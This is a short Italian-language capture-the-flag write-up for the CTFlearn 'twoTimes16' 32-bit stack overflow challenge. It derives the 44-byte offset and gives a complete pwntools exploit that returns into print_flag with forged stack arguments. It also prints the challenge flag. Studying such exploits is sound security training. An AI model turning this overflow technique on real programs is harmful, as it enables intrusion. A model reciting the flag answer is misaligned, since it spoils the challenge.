# twoTimes16 - PWN (Stack Overflow 32-bit + controllo argomenti)

**Flag:** `CTFlearn{h3yyy_n0w_y0u_h4v3_7h3_c0n7r0l}`
**Nota:** binario **a 32 bit (i386)**. Qui non si puo' eseguire localmente perche' (a) manca la `libc.so.6` a 32 bit che il binario cerca, e (b) `print_flag` apre `/flag.txt` (percorso assoluto, non la `flag.txt` locale). Sul server della challenge `/flag.txt` esiste e stampa la flag. L'exploit sotto e' derivato staticamente dal disassemblato.

## Analisi
`vuln()` legge 64 byte in `char buf[32]` --> overflow. `print_flag(int p1, unsigned p2)` stampa la flag solo se `p1 == -1337` e `p2 == 0xC0FFEE`, ma viene chiamata con `(-1, 2)`.

Dal disassemblato:
- `buf` e' a `ebp-0x28` --> offset fino al return address = `0x28 + 4 = 44` byte
- `print_flag @ 0x80491d6`
- essendo 32 bit, gli argomenti vanno sullo **stack** dopo il return address.

## Exploit - passo per passo
Struttura del payload (32 bit):
```
'A'*44 + print_flag + ret_fittizio + arg1(-1337) + arg2(0xC0FFEE)
```
Con pwntools:
```python
from pwn import *
context.arch = 'i386'
p = process('./task')          # sul server: p = remote(host, port)
payload  = b'A'*44
payload += p32(0x80491d6)      # print_flag
payload += p32(0x0)            # return fittizio (dopo print_flag)
payload += p32(0xFFFFFAC7)     # -1337 come uint32
payload += p32(0xC0FFEE)       # 0xC0FFEE
p.sendline(payload)
print(p.recvall().decode())
```
Totale = 44 + 4 + 4 + 4 + 4 = 60 byte (entra nei 64 letti).

- `-1337` in complemento a due a 32 bit = `0xFFFFFAC7`
- quando ritorna, `print_flag` vede `p1 = -1337` e `p2 = 0xC0FFEE` --> apre `/flag.txt` e stampa la flag.


